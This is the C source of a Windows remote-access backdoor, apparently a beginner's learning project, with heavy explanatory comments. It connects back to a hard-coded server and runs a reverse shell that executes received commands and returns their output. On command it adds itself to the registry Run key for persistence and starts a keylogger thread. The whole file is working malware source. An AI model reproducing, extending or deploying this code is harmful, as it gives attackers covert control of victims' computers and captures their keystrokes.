#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <wininet.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "keylogger.h"

/*
 * NOTE
 * This code will be EXTENSIVELY commented
 * I have never done socket programming before, and will write out
 * what each line does for personal reference
 */

#define bzero(p, size) (void) memset((p), '\0', (size)); // because memset will be used many times

int sock;

int bootRun()
{
	char err[128] = "Failed\n";
	char suc[128] = "Created Persistence At: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurentVersion\\Run\n";
	TCHAR szPath[MAX_PATH];
	DWORD pathLen = 0;

	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
	if (pathLen == 0)
	{
		send(sock, err, sizeof(err), 0);
		return(-1);
	}

	HKEY NewVal;
	
	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS)
	{
		send(sock, err, sizeof(err), 0);
		return(-1);
	}
	
	DWORD pathLenInBytes = pathLen * sizeof(*szPath);
	
	if (RegSetValueEx(NewVal, TEXT("BegginnerMalware"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS)
	{
		RegCloseKey(NewVal);
		send(sock, err, sizeof(err), 0);
		return(-1);
	}
	
	RegCloseKey(NewVal);
	return(0);
}

void Shell()
{
	char buffer[1024];
	char container[1024];
	char total_response[18384];

	while(1)
	{
		bzero(buffer, sizeof(buffer));
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));
		
		recv(sock, buffer, sizeof(buffer), 0); // receives command from server and stores in buffer

		if (strncmp("q", buffer, 1) == 0) // checks if command in buffer is "q"
		{
			closesocket(sock); // closes opened socket
			WSACleanup(); // performs windows cleanup
			exit(0); // end program
		}
		else if (strncmp("cd ", buffer, 3) == 0)
		{
			chdir(buffer + 3);
			send(sock, total_response, sizeof(total_response), 0);
		}
		else if (strncmp("persist", buffer, 7) == 0)
		{
			if (bootRun() == -1)
			{
				strncpy(total_response, "Error: Failed to create persistence", sizeof(total_response));
			} 
			else
			{
				strncpy(total_response, "Successfully created persistence", sizeof(total_response));
			}
			send(sock, total_response, sizeof(total_response), 0);
		}
		else if (strncmp("keylog_start", buffer, 12) == 0)
		{
			HANDLE thread = CreateThread(NULL, 0, &logg, NULL, 0, NULL);

			if (thread == NULL)
			{
				strncpy(total_response, "Error: Failed to create threat for keylogger", sizeof(total_response));
			} 
			else
			{
				strncpy(total_response, "Successfully created keylogger thread", sizeof(total_response));
			}

			send(sock, total_response, sizeof(total_response), 0);
		}
		else
		{
			FILE *fp;
			fp = _popen(buffer, "r"); // execute command in buffer and store command output in the file fp points to
			while(fgets(container, sizeof(container), fp)) // store contents of file, identified by pointer fp, in container
			{
				strcat(total_response, container); // only concatonate container to total_response if fgets is successful
			}
			send(sock, total_response, sizeof(total_response), 0); // sends character array total_response back to the server
			fclose(fp); // closes file stream
		}
	}
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{

	struct sockaddr_in ServAddr; // initialize a sockaddr_in structure - specifies address and port for IPV4/AF_INET
	unsigned short ServPort;
	char *ServIP;
	WSADATA wsaData; //contains data about windows sockets, needed to establish a connection to windows machine

	ServIP = "192.168.1.32"; // hard code to IP of receiving server
	ServPort = 50005; //any port that exists and is not being used works

	// checks if connection is successful
	if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
	{
		exit(1);
	}

	sock = socket(AF_INET, SOCK_STREAM, 0); // first two params specificy IPV4 and TCP - sets up socket
	
	memset(&ServAddr, '\0', sizeof(ServAddr)); // sets contents of ServAddr address to null 
	ServAddr.sin_family = AF_INET; // sets sin_family member to AF_INET/IPV4 (must always be AF_INET)
	
		
	// converts ServIP and ServPort to address and port values (int and 16-bit number in network byte order)
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
	ServAddr.sin_port = htons(ServPort);

	// attempt to connect every 10 seconds until a connection is succesful
	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)
	{
		Sleep(10);
	}
	
	Shell();
}
